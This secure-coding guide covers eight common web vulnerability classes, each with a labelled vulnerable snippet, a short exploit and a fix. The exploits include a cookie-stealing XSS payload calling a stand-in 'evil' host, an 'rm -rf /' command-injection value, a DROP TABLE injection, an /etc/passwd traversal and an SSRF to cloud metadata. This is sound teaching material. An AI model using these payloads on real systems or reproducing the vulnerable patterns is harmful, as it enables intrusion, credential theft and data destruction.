# Vulnerability Classes — Signatures, Exploits, Fixes

A field guide to the classes you audit most. Each entry: how to spot it, a concrete exploit, and the
correct fix. Fixes favor **parameterization, output encoding, and allow-lists** over blocklists.

## 1. SQL / NoSQL Injection (OWASP A03)

**Signature:** request data concatenated or interpolated into a query string.
```js
db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`);   // VULNERABLE
```
**Exploit:** `email = ' OR '1'='1` returns all rows; `'; DROP TABLE users--` destroys data.
**Fix:** parameterized query; bind values, never interpolate.
```js
db.query('SELECT * FROM users WHERE email = ?', [req.body.email]);   // SAFE
```
Identifiers (column/table/sort) can't be bound — **allow-list** them:
```js
const COLS = { created_at: 'created_at', total: 'total' };
const col = COLS[req.query.sort] ?? 'created_at';
```
NoSQL variant: `User.find({ name: req.body.name })` where `name` is `{ "$ne": null }` → operator
injection. Fix: cast to string / reject object-typed values for scalar fields.

## 2. Broken Access Control / IDOR (OWASP A01)

**Signature:** an object id from the request used to fetch/mutate data with **no ownership check**.
```js
app.get('/invoices/:id', auth, async (req, res) => {
  res.json(await db.invoices.findById(req.params.id));   // VULNERABLE: any user reads any invoice
});
```
**Exploit:** authenticated user iterates `:id` to read others' invoices (horizontal escalation).
**Fix:** check ownership against the session principal; return 404 (not 403) to avoid leaking
existence.
```js
const inv = await db.invoices.findById(req.params.id);
if (!inv || inv.userId !== req.session.userId) return res.status(404).end();
res.json(inv);
```
Also: missing role checks on admin routes (vertical escalation), and trusting a client-supplied
`role`/`isAdmin` field. Authentication ≠ authorization.

## 3. OS Command Injection (OWASP A03)

**Signature:** request data passed through a shell.
```js
exec(`convert ${req.query.file} out.png`);   // VULNERABLE
```
**Exploit:** `file = x.png; rm -rf /` runs arbitrary commands.
**Fix:** avoid the shell; use an argv array via `execFile`, and allow-list inputs.
```js
execFile('convert', [path.basename(req.query.file), 'out.png']);   // SAFE
```

## 4. Cross-Site Scripting / XSS (OWASP A03)

**Signature:** untrusted data written into HTML without contextual encoding.
```jsx
<div dangerouslySetInnerHTML={{ __html: comment.body }} />   // VULNERABLE (stored XSS)
element.innerHTML = req.query.q;                              // VULNERABLE (reflected XSS)
```
**Exploit:** `body = <img src=x onerror=fetch('//evil/'+document.cookie)>` steals sessions.
**Fix:** render as text (`textContent`, framework auto-escaping). If raw HTML is truly required,
sanitize with a vetted allow-list sanitizer (e.g. DOMPurify) — never a hand-rolled blocklist.

## 5. Hardcoded Secrets / Cryptographic Failures (OWASP A02/A07)

**Signature:** keys, tokens, passwords, or private keys committed in source.
```js
const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';                  // VULNERABLE (example/fake — illustration)
const token = 'sk_live_4eC39Hq…';                        // VULNERABLE (truncated fake — illustration)
```
**Exploit:** anyone with repo (or git history, or a leaked build) access uses the credential directly.
**Fix:** move to env / secret manager; **rotate** the exposed secret (history retains it); add a
pre-commit secret scan. Detect with `scripts/scan-secrets.mjs`.
Crypto adjacent: passwords hashed with MD5/SHA1 → use bcrypt/scrypt/argon2 + salt. Token compare with
`==` → constant-time compare (`crypto.timingSafeEqual`).

## 6. Insecure Deserialization (OWASP A08)

**Signature:** untrusted bytes fed to a deserializer that can instantiate objects.
```python
data = pickle.loads(request.body)        # VULNERABLE: pickle can execute on load
cfg  = yaml.load(user_input)             # VULNERABLE: full loader builds arbitrary objects
```
**Exploit:** crafted payload triggers code execution during deserialization (RCE).
**Fix:** use safe formats/parsers — `json.loads`, `yaml.safe_load`; validate against a schema; never
deserialize untrusted input into live objects. JS: avoid `eval`/`Function`; guard against prototype
pollution (`__proto__`/`constructor` keys) when merging request objects.

## 7. Server-Side Request Forgery / SSRF (OWASP A10)

**Signature:** a user-influenced URL or host reaching an outbound request.
```js
const r = await fetch(req.query.url);   // VULNERABLE
```
**Exploit:** `url = http://169.254.169.254/latest/meta-data/` reads cloud credentials; or pivots to
internal services behind the firewall.
**Fix:** allow-list permitted hosts/schemes; resolve the hostname and **reject private/link-local
ranges** (10/8, 172.16/12, 192.168/16, 127/8, 169.254/16) and the metadata IP; disable redirects to
unvetted hosts.

## 8. Path Traversal (OWASP A01)

**Signature:** request data used to build a filesystem path.
```js
fs.readFile(path.join('/var/data', req.query.name));   // VULNERABLE
```
**Exploit:** `name = ../../../../etc/passwd` escapes the base directory.
**Fix:** strip directory components and confine to a base dir.
```js
const base = path.resolve('/var/data');
const target = path.resolve(base, path.basename(req.query.name));
if (!target.startsWith(base + path.sep)) throw new Error('invalid path');   // SAFE
```

## Quick mapping to OWASP Top 10 (2021)

| Class | Category |
|---|---|
| Broken access control, IDOR, path traversal | A01 |
| Cryptographic failures, hardcoded secrets | A02 |
| SQL/command/XSS/SSTI injection | A03 |
| Security misconfiguration, permissive CORS | A05 |
| Vulnerable/outdated dependencies | A06 |
| Weak auth, password hashing, timing compare | A07 |
| Insecure deserialization, prototype pollution | A08 |
| SSRF | A10 |
